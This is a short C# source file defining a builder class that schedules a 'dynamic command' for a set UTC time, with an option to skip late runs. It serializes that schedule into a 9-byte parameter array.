using System;

namespace Orcus.Shared.DynamicCommands.ExecutionEvents
{
    /// <summary>
    ///     Execute the command at a specific date and time
    /// </summary>
    public class DateTimeExecutionEventBuilder : IExecutionEventBuilder
    {
        /// <summary>
        ///     The time as UTC
        /// </summary>
        public DateTime DateTime { get; set; }

        /// <summary>
        ///     Don't execute the command if the delay is greater than 1 hour
        /// </summary>
        public bool DontExecuteWithDelay { get; set; }

        /// <summary>
        ///     The id of <see cref="DateTimeExecutionEventBuilder" /> is 1
        /// </summary>
        public uint Id { get; } = 1;

        /// <summary>
        ///     Get the parameter of this <see cref="ExecutionEvent" />
        /// </summary>
        /// <returns>The parameter of this execution event which provides all neccessary options</returns>
        public byte[] GetParameter()
        {
            var data = new byte[9];
            data[0] = DontExecuteWithDelay ? (byte) 1 : (byte) 0;
            Array.Copy(BitConverter.GetBytes(DateTime.ToBinary()), 0, data, 1, 8);

            return data;
        }
    }
}